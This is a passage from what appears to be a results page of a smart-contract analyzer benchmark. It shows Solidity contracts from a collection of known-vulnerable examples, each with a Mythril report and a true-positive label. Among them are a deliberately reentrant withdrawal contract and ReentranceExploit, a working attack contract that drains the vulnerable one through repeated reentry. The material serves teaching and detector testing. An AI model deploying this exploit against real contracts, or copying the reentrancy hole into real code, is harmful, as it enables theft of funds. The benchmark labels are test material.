    <span class="kd">function</span> <span class="n">changeProposalDeposit</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalDeposit</span><span class="p">)</span> <span class="n">noEther</span> <span class="kr">external</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)</span> <span class="o">||</span> <span class="n">_proposalDeposit</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">actualBalance</span><span class="p">()</span> <span class="o">+</span> <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)])</span>
            <span class="o">/</span> <span class="n">maxDepositDivisor</span><span class="p">)</span> <span class="p">{</span>

            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proposalDeposit</span> <span class="o">=</span> <span class="n">_proposalDeposit</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">changeAllowedRecipients</span><span class="p">(</span><span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_allowed</span><span class="p">)</span> <span class="n">noEther</span> <span class="kr">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">!=</span> <span class="n">curator</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="n">allowedRecipients</span><span class="p">[</span><span class="n">_recipient</span><span class="p">]</span> <span class="o">=</span> <span class="n">_allowed</span><span class="p">;</span>
        <span class="n">AllowedRecipientChanged</span><span class="p">(</span><span class="n">_recipient</span><span class="p">,</span> <span class="n">_allowed</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">isRecipientAllowed</span><span class="p">(</span><span class="kt">address</span> <span class="n">_recipient</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_isAllowed</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">allowedRecipients</span><span class="p">[</span><span class="n">_recipient</span><span class="p">]</span>
            <span class="o">||</span> <span class="p">(</span><span class="n">_recipient</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="n">extraBalance</span><span class="p">)</span>
                <span class="c1">// only allowed when at least the amount held in the</span>
                <span class="c1">// extraBalance account has been spent from the DAO</span>
                <span class="o">&amp;&amp;</span> <span class="n">totalRewardToken</span> <span class="o">&gt;</span> <span class="n">extraBalance</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">()))</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="k">else</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">actualBalance</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_actualBalance</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">this</span><span class="p">.</span><span class="nb">balance</span> <span class="o">-</span> <span class="n">sumOfProposalDeposits</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">minQuorum</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="kr">internal</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_minQuorum</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// minimum of 20% and maximum of 53.33%</span>
        <span class="k">return</span> <span class="n">totalSupply</span> <span class="o">/</span> <span class="n">minQuorumDivisor</span> <span class="o">+</span>
            <span class="p">(</span><span class="n">_value</span> <span class="o">*</span> <span class="n">totalSupply</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="p">(</span><span class="n">actualBalance</span><span class="p">()</span> <span class="o">+</span> <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]));</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">halveMinQuorum</span><span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// this can only be called after `quorumHalvingPeriod` has passed or at anytime</span>
        <span class="c1">// by the curator with a delay of at least `minProposalDebatePeriod` between the calls</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">lastTimeMinQuorumMet</span> <span class="o">&lt;</span> <span class="p">(</span><span class="nb">now</span> <span class="o">-</span> <span class="n">quorumHalvingPeriod</span><span class="p">)</span> <span class="o">||</span> <span class="nb">msg.sender</span> <span class="o">==</span> <span class="n">curator</span><span class="p">)</span>
            <span class="o">&amp;&amp;</span> <span class="n">lastTimeMinQuorumMet</span> <span class="o">&lt;</span> <span class="p">(</span><span class="nb">now</span> <span class="o">-</span> <span class="n">minProposalDebatePeriod</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">lastTimeMinQuorumMet</span> <span class="o">=</span> <span class="nb">now</span><span class="p">;</span>
            <span class="n">minQuorumDivisor</span> <span class="o">*=</span> <span class="mi">2</span><span class="p">;</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">createNewDAO</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newCurator</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="n">DAO</span> <span class="n">_newDAO</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">NewCurator</span><span class="p">(</span><span class="n">_newCurator</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">daoCreator</span><span class="p">.</span><span class="n">createDAO</span><span class="p">(</span><span class="n">_newCurator</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">now</span> <span class="o">+</span> <span class="n">splitExecutionPeriod</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">numberOfProposals</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_numberOfProposals</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Don&#39;t count index 0. It&#39;s used by isBlocked() and exists from start</span>
        <span class="k">return</span> <span class="n">proposals</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">getNewDAOAddress</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">_newDAO</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">].</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">isBlocked</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">blocked</span><span class="p">[</span><span class="n">_account</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">blocked</span><span class="p">[</span><span class="n">_account</span><span class="p">]];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">blocked</span><span class="p">[</span><span class="n">_account</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">unblockMe</span><span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">isBlocked</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">DAO_Creator</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="n">createDAO</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_curator</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_proposalDeposit</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_minTokensToCreate</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_closingTime</span>
    <span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="n">DAO</span> <span class="n">_newDAO</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">return</span> <span class="k">new</span> <span class="n">DAO</span><span class="p">(</span>
            <span class="n">_curator</span><span class="p">,</span>
            <span class="n">DAO_Creator</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
            <span class="n">_proposalDeposit</span><span class="p">,</span>
            <span class="n">_minTokensToCreate</span><span class="p">,</span>
            <span class="n">_closingTime</span><span class="p">,</span>
            <span class="nb">msg.sender</span>
        <span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=reentrancy/Reentrancy>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//reentrancy/Reentrancy.sol">reentrancy/Reentrancy</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Reentrancy</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Reentrance</span> <span class="p">{</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">userBalance</span><span class="p">;</span>
   
    <span class="kd">function</span> <span class="n">getBalance</span><span class="p">(</span><span class="kt">address</span> <span class="n">u</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
        <span class="k">return</span> <span class="n">userBalance</span><span class="p">[</span><span class="n">u</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">addToBalance</span><span class="p">()</span> <span class="kr">payable</span><span class="p">{</span>
        <span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg.value</span><span class="p">;</span>
    <span class="p">}</span>   

    <span class="kd">function</span> <span class="n">withdrawBalance</span><span class="p">(){</span>
        <span class="c1">// send userBalance[msg.sender] ethers to msg.sender</span>
        <span class="c1">// if mgs.sender is a contract, it will call its fallback function</span>
        <span class="k">if</span><span class="p">(</span> <span class="o">!</span> <span class="p">(</span><span class="nb">msg.sender</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">])()</span> <span class="p">)</span> <span class="p">){</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>   

    <span class="kd">function</span> <span class="n">withdrawBalance_fixed</span><span class="p">(){</span>
        <span class="c1">// to protect against re-entrancy, the state variable</span>
        <span class="c1">// has to be change before the call</span>
        <span class="kt">uint</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">];</span>
        <span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span> <span class="o">!</span> <span class="p">(</span><span class="nb">msg.sender</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">amount</span><span class="p">)()</span> <span class="p">)</span> <span class="p">){</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>   

    <span class="kd">function</span> <span class="n">withdrawBalance_fixed_2</span><span class="p">(){</span>
        <span class="c1">// send() and transfer() are safe against reentrancy</span>
        <span class="c1">// they do not transfer the remaining gas</span>
        <span class="c1">// and they give just enough gas to execute few instructions    </span>
        <span class="c1">// in the fallback function (no further call possible)</span>
        <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]);</span>
        <span class="n">userBalance</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>   
   
<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 28: msg.sender.call.value(amount)()</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `withdrawBalance_fixed()` a non-zero amount of Ether is sent to msg.sender.
It seems that this function can be called without restrictions.
                          <h5>Location</h5>
           <pre>Line 28: msg.sender.call.value(amount)()</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to the address of the transaction sender. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                          <h5>Location</h5>
           <pre>Line 17: msg.sender.call.value(userBalance[msg.sender])()</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `withdrawBalance()` a non-zero amount of Ether is sent to msg.sender.
It seems that this function can be called without restrictions.
                          <h5>Location</h5>
           <pre>Line 17: msg.sender.call.value(userBalance[msg.sender])()</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to the address of the transaction sender. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                          <h5>Location</h5>
           <pre>Line 20: userBalance[msg.sender] = 0</pre>
                  <h5>Issue State change after external call (Warning)</h5>
         The contract account state is changed after an external call. Consider that the called contract could re-enter the function before this state change takes place. This can lead to business logic vulnerabilities.
                          <h5>Location</h5>
           <pre>Line 11: userBalance[msg.sender] += msg.value</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `addToBalance()`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 38: msg.sender.transfer(userBalance[msg.sender])</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `withdrawBalance_fixed_2()` a non-zero amount of Ether is sent to msg.sender.
It seems that this function can be called without restrictions.
                <hr>
    <h3 id=reentrancy/ReentrancyExploit>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//reentrancy/ReentrancyExploit.sol">reentrancy/ReentrancyExploit</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Reentrancy</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">ReentranceExploit</span> <span class="p">{</span>
    <span class="kt">bool</span> <span class="kr">public</span> <span class="n">attackModeIsOn</span><span class="o">=</span><span class="kc">false</span><span class="p">;</span> 
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">vulnerable_contract</span><span class="p">;</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">owner</span><span class="p">;</span>

    <span class="kd">function</span> <span class="n">ReentranceExploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">deposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_vulnerable_contract</span><span class="p">)</span> <span class="kr">public</span> <span class="kr">payable</span><span class="p">{</span>
        <span class="n">vulnerable_contract</span> <span class="o">=</span> <span class="n">_vulnerable_contract</span> <span class="p">;</span>
        <span class="c1">// call addToBalance with msg.value ethers</span>
        <span class="nf">require</span><span class="p">(</span><span class="n">vulnerable_contract</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="nb">msg.value</span><span class="p">)(</span><span class="kt">bytes4</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="s">&quot;addToBalance()&quot;</span><span class="p">))));</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">launch_attack</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="n">attackModeIsOn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="c1">// call withdrawBalance</span>
        <span class="c1">// withdrawBalance calls the fallback of ReentranceExploit</span>
        <span class="nf">require</span><span class="p">(</span><span class="n">vulnerable_contract</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="kt">bytes4</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="s">&quot;withdrawBalance()&quot;</span><span class="p">))));</span>
    <span class="p">}</span>  


    <span class="kd">function</span> <span class="p">()</span> <span class="kr">public</span> <span class="kr">payable</span><span class="p">{</span>
        <span class="c1">// atackModeIsOn is used to execute the attack only once</span>
        <span class="c1">// otherwise there is a loop between withdrawBalance and the fallback function</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">attackModeIsOn</span><span class="p">){</span>
            <span class="n">attackModeIsOn</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                <span class="nf">require</span><span class="p">(</span><span class="n">vulnerable_contract</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="kt">bytes4</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="s">&quot;withdrawBalance()&quot;</span><span class="p">))));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">get_money</span><span class="p">(){</span>
        <span class="nb">suicide</span><span class="p">(</span><span class="n">owner</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 31: vulnerable_contract.call(bytes4(sha3(&#34;withdrawBalance()&#34;)))</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to an address found at storage slot 0. This storage slot can be written to by calling the function `fallback`. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                          <h5>Location</h5>
           <pre>Line 31: vulnerable_contract.call(bytes4(sha3(&#34;withdrawBalance()&#34;)))</pre>
                  <h5>Issue Transaction order dependence (Warning)</h5>
         A possible transaction order independence vulnerability exists in function fallback. The value or direction of the call statement is determined from a tainted storage location
                          <h5>Location</h5>
           <pre>Line 22: vulnerable_contract.call(bytes4(sha3(&#34;withdrawBalance()&#34;)))</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to an address found at storage slot 0. This storage slot can be written to by calling the function `fallback`. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                          <h5>Location</h5>
           <pre>Line 22: vulnerable_contract.call(bytes4(sha3(&#34;withdrawBalance()&#34;)))</pre>
                  <h5>Issue Transaction order dependence (Warning)</h5>
         A possible transaction order independence vulnerability exists in function launch_attack(). The value or direction of the call statement is determined from a tainted storage location
                          <h5>Location</h5>
           <pre>Line 36: suicide(owner)</pre>
                  <h5>Issue Unchecked SUICIDE (Warning)</h5>
         The function `get_money()` executes the SUICIDE instruction. The remaining Ether is sent to a stored address.

It seems that this function can be called without restrictions.
                          <h5>Location</h5>
           <pre>Line 15: vulnerable_contract.call.value(msg.value)(bytes4(sha3(&#34;addToBalance()&#34;)))</pre>
                  <h5>Issue Message call to external contract (Warning)</h5>
         This contract executes a message call to an address provided as a function argument. Generally, it is not recommended to call user-supplied addresses using Solidity&#39;s call() construct. Note that attackers might leverage reentrancy attacks to exploit race conditions or manipulate this contract&#39;s state.
                <hr>
    <h3 id=unchecked_external_call/KotET_source_code/KingOfTheEtherThrone>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//unchecked_external_call/KotET_source_code/KingOfTheEtherThrone.sol">unchecked_external_call/KotET_source_code/KingOfTheEtherThrone</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Unchecked External Call</td>
	        <td style="background-color:
		   rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="c1">// A chain-game contract that maintains a &#39;throne&#39; which agents may pay to rule.</span>
<span class="c1">// See www.kingoftheether.com &amp; https://github.com/kieranelby/KingOfTheEtherThrone .</span>
<span class="c1">// (c) Kieran Elby 2016. All rights reserved.</span>
<span class="c1">// v0.4.0.</span>
<span class="c1">// Inspired by ethereumpyramid.com and the (now-gone?) &quot;magnificent bitcoin gem&quot;.</span>

<span class="c1">// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0</span>
<span class="c1">// and was compiled (using optimization) with:</span>
<span class="c1">// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum</span>

<span class="c1">// For future versions it would be nice to ...</span>
<span class="c1">// TODO - enforce time-limit on reign (can contracts do that without external action)?</span>
<span class="c1">// TODO - add a random reset?</span>
<span class="c1">// TODO - add bitcoin bridge so agents can pay in bitcoin?</span>
<span class="c1">// TODO - maybe allow different return payment address?</span>

<span class="kd">contract</span> <span class="n">KingOfTheEtherThrone</span> <span class="p">{</span>

    <span class="kd">struct</span> <span class="n">Monarch</span> <span class="p">{</span>
        <span class="c1">// Address to which their compensation will be sent.</span>
        <span class="kt">address</span> <span class="n">etherAddress</span><span class="p">;</span>
        <span class="c1">// A name by which they wish to be known.</span>
        <span class="c1">// NB: Unfortunately &quot;string&quot; seems to expose some bugs in web3.</span>
        <span class="kt">string</span> <span class="n">name</span><span class="p">;</span>
        <span class="c1">// How much did they pay to become monarch?</span>
        <span class="kt">uint</span> <span class="n">claimPrice</span><span class="p">;</span>
        <span class="c1">// When did their rule start (based on block.timestamp)?</span>
        <span class="kt">uint</span> <span class="n">coronationTimestamp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// The wizard is the hidden power behind the throne; they</span>
    <span class="c1">// occupy the throne during gaps in succession and collect fees.</span>
    <span class="kt">address</span> <span class="n">wizardAddress</span><span class="p">;</span>

    <span class="c1">// Used to ensure only the wizard can do some things.</span>
    <span class="kd">modifier</span> <span class="n">onlywizard</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">==</span> <span class="n">wizardAddress</span><span class="p">)</span> <span class="kr">_</span> <span class="p">}</span>

    <span class="c1">// How much must the first monarch pay?</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">startingClaimPrice</span> <span class="o">=</span> <span class="mi">100</span> <span class="kc">finney</span><span class="p">;</span>

    <span class="c1">// The next claimPrice is calculated from the previous claimFee</span>
    <span class="c1">// by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -</span>
    <span class="c1">// for example, num=3 and den=2 would cause a 50% increase.</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">claimPriceAdjustNum</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">claimPriceAdjustDen</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>

    <span class="c1">// How much of each claimFee goes to the wizard (expressed as a fraction)?</span>
    <span class="c1">// e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as</span>
    <span class="c1">// the compensation fee for the usurped monarch.</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">wizardCommissionFractionNum</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">wizardCommissionFractionDen</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>

    <span class="c1">// How much must an agent pay now to become the monarch?</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">currentClaimPrice</span><span class="p">;</span>

    <span class="c1">// The King (or Queen) of the Ether.</span>
    <span class="n">Monarch</span> <span class="kr">public</span> <span class="n">currentMonarch</span><span class="p">;</span>

    <span class="c1">// Earliest-first list of previous throne holders.</span>
    <span class="n">Monarch</span><span class="p">[]</span> <span class="kr">public</span> <span class="n">pastMonarchs</span><span class="p">;</span>

    <span class="c1">// Create a new throne, with the creator as wizard and first ruler.</span>
    <span class="c1">// Sets up some hopefully sensible defaults.</span>
    <span class="kd">function</span> <span class="n">KingOfTheEtherThrone</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">wizardAddress</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
        <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="n">startingClaimPrice</span><span class="p">;</span>
        <span class="n">currentMonarch</span> <span class="o">=</span> <span class="n">Monarch</span><span class="p">(</span>
            <span class="n">wizardAddress</span><span class="p">,</span>
            <span class="s">&quot;[Vacant]&quot;</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="nb">block.timestamp</span>
        <span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">numberOfMonarchs</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">pastMonarchs</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Fired when the throne is claimed.</span>
    <span class="c1">// In theory can be used to help build a front-end.</span>
    <span class="kd">event</span> <span class="n">ThroneClaimed</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">usurperEtherAddress</span><span class="p">,</span>
        <span class="kt">string</span> <span class="n">usurperName</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">newClaimPrice</span>
    <span class="p">);</span>

    <span class="c1">// Fallback function - simple transactions trigger this.</span>
    <span class="c1">// Assume the message data is their desired name.</span>
    <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">claimThrone</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1">// Claim the throne for the given name by paying the currentClaimFee.</span>
    <span class="kd">function</span> <span class="n">claimThrone</span><span class="p">(</span><span class="kt">string</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>

        <span class="kt">uint</span> <span class="n">valuePaid</span> <span class="o">=</span> <span class="nb">msg.value</span><span class="p">;</span>

        <span class="c1">// If they paid too little, reject claim and refund their money.</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">valuePaid</span> <span class="o">&lt;</span> <span class="n">currentClaimPrice</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">valuePaid</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// If they paid too much, continue with claim but refund the excess.</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">valuePaid</span> <span class="o">&gt;</span> <span class="n">currentClaimPrice</span><span class="p">)</span> <span class="p">{</span>
